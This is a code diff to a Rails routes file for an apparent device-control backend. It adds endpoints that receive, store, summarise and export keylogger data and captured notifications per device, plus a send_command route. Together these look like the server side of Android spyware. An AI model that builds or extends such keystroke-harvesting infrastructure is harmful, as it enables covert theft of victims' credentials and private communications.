@@ -9,15 +9,27 @@ Rails.application.routes.draw do
     resources :commands, only: [:show] do
       member do
         post :ack
+        post :send_command
       end
     end
     post 'location', to: 'commands#location'
     get 'devices/online', to: 'devices#online'
+    
+    # Keylogger API endpoints (ENHANCED)
+    post 'keylogger', to: 'keylogger#receive'
+    post 'keylogger/ack', to: 'keylogger#acknowledge' # ACK confirmation
+    get 'keylogger/data/:device_id', to: 'keylogger#data'
+    get 'keylogger/stats/:device_id', to: 'keylogger#stats' # Statistics
+    get 'keylogger/export/:device_id', to: 'keylogger#export' # CSV/HTML export
+    
+    # Notifications API endpoints
+    post 'notifications', to: 'notifications#receive'
+    get 'notifications/:device_id', to: 'notifications#index'
   end
 
   # Admin config save endpoint
   namespace :admin do
-    post 'android_config/update', to: 'android_config#update'
+    post 'android_config/update', to: 'android_settings#update', as: 'android_config_update'
   end
 
   resources :apk_installations
